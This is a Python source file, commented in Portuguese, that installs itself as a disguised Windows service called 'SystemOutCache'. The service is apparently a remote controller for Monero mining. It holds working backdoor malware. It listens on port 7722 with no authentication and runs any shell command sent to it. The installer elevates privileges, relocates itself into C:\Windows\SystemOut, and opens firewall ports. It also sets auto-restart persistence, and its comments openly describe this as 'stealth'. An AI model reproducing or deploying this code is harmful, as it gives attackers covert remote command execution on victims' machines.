#!/usr/bin/env python3
# Arquivo: SystemOutCache.py

import socket
import threading
import subprocess
import os
import ctypes
import sys
import psutil
from datetime import datetime
import platform
import time
import shutil
import win32serviceutil
import win32service
import win32event
import servicemanager

# Configurações do Serviço Windows
SERVICE_NAME = "SystemOutCache"
SERVICE_DISPLAY_NAME = "SystemOutCache Service"
SERVICE_DESCRIPTION = "System Output Caching and Reporting Service"

HOST = '0.0.0.0'
PORT = 7722

class ProcessController:
    def __init__(self):
        self.processes = {}
        self.next_id = 1
        self.lock = threading.Lock()
    
    def start_process(self, command, work_dir=None):
        """Inicia um processo (Serviços rodam em Session 0, sem GUI visível)"""
        try:
            if work_dir and not os.path.isdir(work_dir):
                raise ValueError(f"Diretório de trabalho inválido: {work_dir}")
            
            # Serviços rodam sem interface, então flags de show window podem não ter efeito visual
            # na sessão do usuário, mas mantemos para compatibilidade.
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE (Executar oculto por padrão no serviço)
            
            # Iniciar processo
            proc = subprocess.Popen(
                command,
                shell=True,
                cwd=work_dir,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                stdout=subprocess.PIPE,     # Capturar saída para evitar bloqueio
                stderr=subprocess.PIPE
            )
            
            # Registrar processo
            with self.lock:
                proc_id = self.next_id
                self.next_id += 1
                
                self.processes[proc_id] = {
                    'id': proc_id,
                    'process': proc,
                    'pid': proc.pid,
                    'command': command,
                    'work_dir': work_dir or os.getcwd(),
                    'started': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'status': 'running'
                }
            
            return proc_id, proc.pid
            
        except Exception as e:
            # Em serviço, prints não aparecem. Ideal seria logar.
            servicemanager.LogErrorMsg(f"Falha ao iniciar '{command}': {e}")
            raise
    
    def stop_process(self, proc_id, kill_children=True):
        """Para um processo"""
        with self.lock:
            if proc_id not in self.processes:
                raise ValueError(f"Processo {proc_id} não encontrado")
            
            proc_info = self.processes[proc_id]
            if proc_info['status'] != 'running':
                raise ValueError(f"Processo {proc_id} não está rodando")
        
        killed_pids = []
        
        try:
            # Matar filhos primeiro se solicitado
            if kill_children:
                try:
                    parent = psutil.Process(proc_info['pid'])
                    children = parent.children(recursive=True)
                    
                    for child in children:
                        try:
                            child.kill()
                            killed_pids.append(child.pid)
                        except:
                            pass
                except:
                    pass
            
            # Matar processo principal
            try:
                proc_info['process'].kill()
                killed_pids.append(proc_info['pid'])
            except:
                pass
            
            # Atualizar status
            with self.lock:
                self.processes[proc_id]['status'] = 'killed'
            
            return killed_pids
            
        except Exception as e:
            servicemanager.LogErrorMsg(f"Falha ao parar processo {proc_id}: {e}")
            raise
    
    def stop_by_name(self, name):
        """Para processos por nome"""
        killed_pids = []
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if name.lower() in proc.info['name'].lower():
                    pid = proc.info['pid']
                    proc.kill()
                    killed_pids.append(pid)
            except:
                continue
        
        return killed_pids
    
    def list_processes(self):
        """Lista processos controlados"""
        with self.lock:
            result = []
            for proc_id, info in self.processes.items():
                # Atualizar status
                if info['status'] == 'running':
                    if info['process'].poll() is not None:
                        info['status'] = 'terminated'
                
                result.append({
                    'id': proc_id,
                    'pid': info['pid'],
                    'command': info['command'],
                    'status': info['status'],
                    'started': info['started']
                })
            
            return result
    
    def find_processes(self, name):
        """Encontra processos por nome"""
        found = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if name.lower() in proc.info['name'].lower():
                    cmdline = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                    found.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'cmdline': cmdline
                    })
            except:
                continue
        
        return found

# Instância global do controlador
controller = ProcessController()

class MoneroRemotoService(win32serviceutil.ServiceFramework):
    _svc_name_ = SERVICE_NAME
    _svc_display_name_ = SERVICE_DISPLAY_NAME
    _svc_description_ = SERVICE_DESCRIPTION

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_running = True
        self.server_socket = None

    def SvcStop(self):
        """Para o serviço"""
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.is_running = False
        win32event.SetEvent(self.hWaitStop)
        log_service("Recebido comando de PARADA.")
        
        # Fecha o socket forçadamente para desbloquear o accept()
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                             servicemanager.PYS_SERVICE_STOPPED,
                             (self._svc_name_, ''))
        log_service("Serviço parado com sucesso.")

    def SvcDoRun(self):
        """Loop principal do serviço"""
        log_service("--- SERVIÇO INICIANDO ---")
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                             servicemanager.PYS_SERVICE_STARTED,
                             (self._svc_name_, ''))
        
        # Define o diretório de trabalho para onde o script/exe está, 
        # para que não rode no System32
        if getattr(sys, 'frozen', False):
            base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
            
        os.chdir(base_path)
        log_service(f"Diretório de trabalho definido para: {base_path}")
        servicemanager.LogInfoMsg(f"MoneroRemoto Service running in: {base_path}")

        # Tenta executar o WinStart.bat na inicialização (feature legado)
        try:
            bat_path = os.path.join(base_path, "WinStart.bat")
            if os.path.exists(bat_path):
                log_service(f"Executando WinStart.bat: {bat_path}")
                subprocess.run(["cmd", "/c", bat_path], shell=True, 
                               cwd=base_path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                servicemanager.LogInfoMsg(f"Executed WinStart.bat successfully.")
            else:
                log_service("WinStart.bat não encontrado (opcional).")
        except Exception as e:
            log_service(f"Falha ao executar WinStart.bat: {e}")
            servicemanager.LogErrorMsg(f"Failed to run WinStart.bat: {e}")

        # Loop principal (Keep-Alive)
        log_service("Entrando no loop principal...")
        while self.is_running:
            try:
                self.run_server()
            except Exception as e:
                log_service(f"CRASH NO SERVIDOR: {e}. Reiniciando em 5s...")
                servicemanager.LogErrorMsg(f"Server crashed: {e}. Restarting in 5s...")
                # Recuo exponencial ou fixo se falhar
                stop_signal = win32event.WaitForSingleObject(self.hWaitStop, 5000)
                if stop_signal == win32event.WAIT_OBJECT_0:
                    break
        log_service("Saindo do loop principal.")

    def run_server(self):
        """Lógica do servidor TCP"""
        HOST = '0.0.0.0'
        PORT = 7722
        
        log_service(f"Iniciando socket em {HOST}:{PORT}")
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((HOST, PORT))
        self.server_socket.listen(10)
        
        log_service(f"Servidor ouvindo na porta {PORT} (Socket Created)")
        servicemanager.LogInfoMsg(f"TCP Server listening on {HOST}:{PORT}")
        
        while self.is_running:
            try:
                # accept() pode bloquear, por isso fechamos o socket no SvcStop
                conn, addr = self.server_socket.accept()
                threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
            except OSError:
                # Ocorre quando o socket é fechado no SvcStop
                break
            except Exception as e:
                log_service(f"Erro no accept: {e}")
                servicemanager.LogErrorMsg(f"Error accepting connection: {e}")


def handle_client(conn, addr):
    """Manipula conexão do cliente"""
    try:
        data = conn.recv(4096).decode('utf-8').strip()
        if not data:
            return
        
        # Log simplificado (em produção, evitar muitos logs para não spammar)
        # servicemanager.LogInfoMsg(f"Command from {addr[0]}: {data}")
        
        try:
            response = process_command(data)
            conn.sendall(response.encode('utf-8'))
        except Exception as e:
            error_msg = f"[ERRO] {str(e)}\n"
            conn.sendall(error_msg.encode('utf-8'))
    
    except Exception as e:
        pass
    finally:
        try:
            conn.close()
        except:
            pass

def process_command(command):
    """Processa comandos"""
    parts = command.split(':', 1)
    if len(parts) < 2:
        return get_help()
    
    cmd = parts[0].upper().strip()
    args = parts[1].strip()
    
    if cmd == "START":
        return cmd_start(args)
    elif cmd == "STOP":
        return cmd_stop(args)
    elif cmd == "STOPNAME":
        return cmd_stop_name(args)
    elif cmd == "LIST":
        return cmd_list()
    elif cmd == "FIND":
        return cmd_find(args)
    elif cmd == "EXEC":
        return cmd_exec(args)
    elif cmd == "PROCESSES":
        return cmd_processes()
    else:
        return get_help()

# --- Funções de Comando (Mantidas da original, com pequenas adaptações) ---

def cmd_start(args):
    if not args: return "[ERRO] Comando não especificado\n"
    work_dir = None
    if " --dir " in args:
        parts = args.split(" --dir ", 1)
        command = parts[0].strip()
        work_dir = parts[1].strip().strip('"')
    else:
        command = args
    try:
        proc_id, pid = controller.start_process(command, work_dir)
        return f"[OK] Processo iniciado - ID: {proc_id}, PID: {pid}\n"
    except Exception as e:
        return f"[ERRO] {str(e)}\n"

def cmd_stop(args):
    try:
        proc_id = int(args.strip())
        killed_pids = controller.stop_process(proc_id)
        return f"[OK] Processo {proc_id} terminado - PIDs: {killed_pids}\n"
    except ValueError: return "[ERRO] ID inválido\n"
    except Exception as e: return f"[ERRO] {str(e)}\n"

def cmd_stop_name(args):
    try:
        name = args.strip()
        if not name: return "[ERRO] Nome não especificado\n"
        killed_pids = controller.stop_by_name(name)
        return f"[OK] {len(killed_pids)} processos '{name}' terminados\n"
    except Exception as e: return f"[ERRO] {str(e)}\n"

def cmd_list():
    processes = controller.list_processes()
    if not processes: return "[INFO] Nenhum processo controlado\n"
    result = "[PROCESSOS CONTROLADOS]\n"
    for proc in processes:
        result += f"ID {proc['id']}: PID {proc['pid']} - {proc['status']} - {proc['started']}\n"
        result += f"  Comando: {proc['command']}\n"
    return result

def cmd_find(args):
    name = args.strip()
    if not name: return "[ERRO] Nome não especificado\n"
    found = controller.find_processes(name)
    if not found: return f"[INFO] Nenhum processo '{name}' encontrado\n"
    result = f"[PROCESSOS ENCONTRADOS - '{name}']\n"
    for proc in found[:20]:
        result += f"PID {proc['pid']}: {proc['name']}\n"
    return result

def cmd_exec(args):
    if not args: return "[ERRO] Comando não especificado\n"
    try:
        # Nota: Shell=True em serviço é restrito, comandos visuais não funcionam
        result = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
        output = (result.stdout or "") + (result.stderr or "")
        return f"[EXEC] Código: {result.returncode}\n{output}\n"
    except Exception as e: return f"[ERRO] {str(e)}\n"

def cmd_processes():
    result = "[PROCESSOS DO SISTEMA (Top 50)]\n"
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
        try:
            processes.append((proc.info['pid'], proc.info['name'], proc.info['cpu_percent']))
        except: continue
    processes.sort(key=lambda x: x[2], reverse=True)
    for pid, name, cpu in processes[:50]:
        result += f"PID {pid:>6}: {name:<25} CPU: {cpu:>5.1f}%\n"
    return result

def get_help():
    return """
=== CONTROLADOR DE PROCESSOS (SERVICE MODE) ===
START:<cmd> [--dir <path>] - Inicia processo background
STOP:<id>                 - Para processo por ID
STOPNAME:<nome>           - Para processos por nome
LIST                      - Lista processos iniciados pelo serviço
FIND:<nome>               - Busca processos no sistema
EXEC:<cmd>                - Executa comando shell e retorna output
PROCESSES                 - Top 50 processos por CPU
"""

def is_admin():
    """Verifica se tem privilégios de administrador"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def log_install(msg):
    """Log para arquivo local para debug de instalação"""
    try:
        base_path = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__))
        log_file = os.path.join(base_path, "install.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {msg}\n")
    except:
        pass

def log_service(msg):
    """Log para arquivo local para debug do SERVIÇO"""
    try:
        # Tenta pegar base path. Se frozen, é o dir do exe. Se não, é o __file__
        # OBS: Quando rodando como serviço, o CWD pode ser system32 antes do chdir, 
        # mas aqui tentamos pegar o path absoluto do binário.
        if getattr(sys, 'frozen', False):
            base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
            
        log_file = os.path.join(base_path, "service_debug.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {msg}\n")
    except:
        pass

def install_self():
    """Instalação automática (Firewall + Serviço + AutoStart)"""
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    
    log_install("Iniciando instalação...")
    
    # 1. Elevação de Privilégios
    if not is_admin():
        log_install("Solicitando elevação de privilégios...")
        print("Solicitando privilégios de administrador para instalação...")
        try:
            # Re-executa o mesmo executável/script com "runas" (elevado)
            if getattr(sys, 'frozen', False):
                # Se for EXE, passamos apenas o flag
                params = "--elevated"
            else:
                # Se for Script, precisamos passar o caminho do script também
                params = f'"{exe_path}" --elevated'

            ret = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 1
            )
            if ret > 32:
                print("Processo elevado iniciado. Fechando este console.")
                log_install("Processo elevado disparado com sucesso.")
                sys.exit(0)
            else:
                msg = "Falha ao elevar privilégios. Execute como Administrador."
                print(msg)
                log_install(msg)
                input("Pressione Enter para sair...")
                sys.exit(1)
        except Exception as e:
            log_install(f"Erro na elevação: {e}")
            print(f"Erro ao solicitar elevação: {e}")
            sys.exit(1)

    print("=== INSTALAÇÃO AUTOMÁTICA MONERO REMOTO ===")
    log_install("Rodando com privilégios de Administrador.")

    # 1.5 Auto-Relocação (Stealth & Persistence)
    # Se estiver rodando como EXE e fora do diretório alvo, se move para lá
    if getattr(sys, 'frozen', False):
        try:
            target_dir = r"C:\Windows\SystemOut"
            target_exe = os.path.join(target_dir, "SystemOutCache.exe")
            current_exe = sys.executable

            # Normaliza caminhos para comparação
            if os.path.normpath(current_exe).lower() != os.path.normpath(target_exe).lower():
                log_install(f"Detectado execução fora do diretório padrão. Movendo para {target_dir}...")
                print(f"[+] Movendo para diretório seguro: {target_dir}")
                
                os.makedirs(target_dir, exist_ok=True)
                shutil.copy2(current_exe, target_exe)
                
                log_install("Cópia realizada. Reiniciando processo a partir do novo local...")
                print("[+] Reiniciando instalação a partir do novo local...")
                
                # Dispara o novo executável
                params = "--elevated"
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", target_exe, params, None, 1
                )
                
                sys.exit(0)
            else:
                log_install("Já rodando do diretório correto. Prosseguindo...")
        except Exception as e:
            log_install(f"Erro na auto-relocação: {e}")
            print(f"[!] Erro ao mover para SystemOut (continuando aqui mesmo): {e}")

    # 2. Configuração de Firewall (Via PowerShell - Mais confiável no Win11)
    # Nomes alterados para 'SystemOutCache Agent' para maior stealth
    print("[+] Configurando Firewall (Porta 7722)...")
    log_install("Configurando Firewall via PowerShell...")
    try:
        ps_cmd_tcp = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent TCP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent TCP' -Direction Inbound -LocalPort 7722 -Protocol TCP -Action Allow }"
        ps_cmd_udp = "if (-not (Get-NetFirewallRule -DisplayName 'SystemOutCache Agent UDP' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'SystemOutCache Agent UDP' -Direction Inbound -LocalPort 7722 -Protocol UDP -Action Allow }"
        
        # Executa TCP
        r1 = subprocess.run(["powershell", "-Command", ps_cmd_tcp], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if r1.returncode != 0 and r1.stderr.strip():
            log_install(f"Erro Firewall TCP: {r1.stderr}")
        else:
            log_install("Firewall TCP configurado (ou ja existente).")

        # Executa UDP
        r2 = subprocess.run(["powershell", "-Command", ps_cmd_udp], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if r2.returncode != 0 and r2.stderr.strip():
            log_install(f"Erro Firewall UDP: {r2.stderr}")
        else:
            log_install("Firewall UDP configurado (ou ja existente).")
            
    except Exception as e:
        err = f"[!] Erro no Firewall: {e}"
        print(err)
        log_install(err)

    # 3. Instalação do Serviço
    print("[+] Instalando Serviço Windows...")
    log_install("Registrando serviço...")
    try:
        win32serviceutil.HandleCommandLine(MoneroRemotoService, argv=[exe_path, 'install'])
        log_install("Serviço registrado com sucesso.")
    except Exception as e:
        err = f"[!] Erro ao instalar serviço: {e}"
        print(err)
        log_install(err)

    # 4. Configuração de Recuperação (SC.EXE)
    print("[+] Configurando Recuperação Automática...")
    try:
        subprocess.run(
            f'sc failure "{SERVICE_NAME}" reset= 0 actions= restart/5000/restart/5000/restart/5000',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        log_install("Recuperação configurada.")
    except Exception as e:
        log_install(f"Erro na recuperação: {e}")
    
    # 5. Iniciar Serviço
    print("[+] Iniciando Serviço...")
    log_install("Iniciando serviço...")
    try:
        win32serviceutil.HandleCommandLine(MoneroRemotoService, argv=[exe_path, 'start'])
        print("\n✅ SUCESSO! O serviço está rodando em background.")
        log_install("Serviço iniciado com sucesso.")
        time.sleep(3)
    except Exception as e:
        err = f"[!] Erro ao iniciar serviço: {e}"
        print(err)
        log_install(err)
        input("Pressione Enter para sair...")

if __name__ == '__main__':
    # Lógica de Inicialização:
    # 1. Se tem argumentos, segue o fluxo normal (win32serviceutil verifica os args)
    # 2. Se NÃO tem argumentos:
    #    a. Tenta conectar ao Service Control Manager (SCM).
    #    b. Se conseguir, é porque foi iniciado pelo Windows como Serviço -> RODA O SERVIÇO.
    #    c. Se falhar (erro 1063), é porque foi clicado pelo usuário -> RODA INSTALAÇÃO.

    if len(sys.argv) > 1:
        # Se for o nosso flag de elevação, rodamos a instalação real
        if sys.argv[1] == "--elevated":
             install_self()
        else:
            win32serviceutil.HandleCommandLine(MoneroRemotoService)
    else:
        # Sem argumentos: Pode ser Serviço ou Duplo Clique do Usuário
        is_service = False
        try:
            # Tenta preparar como se fosse um serviço
            # Isso só funciona se estiver sendo chamado pelo SCM
            servicemanager.Initialize()
            servicemanager.PrepareToHostSingle(MoneroRemotoService)
            # Tenta iniciar o dispatcher. Se não for serviço, isso lança erro imediatamente.
            servicemanager.StartServiceCtrlDispatcher()
            is_service = True
        except Exception as e:
            # Se falhou, é porque não somos um serviço (provavelmente usuário clicou)
            # Erro comum: win32service.error: (1063, 'StartServiceCtrlDispatcher', 'O processo do serviço não pôde se conectar ao controlador de serviço.')
            is_service = False
        
        if not is_service:
            install_self()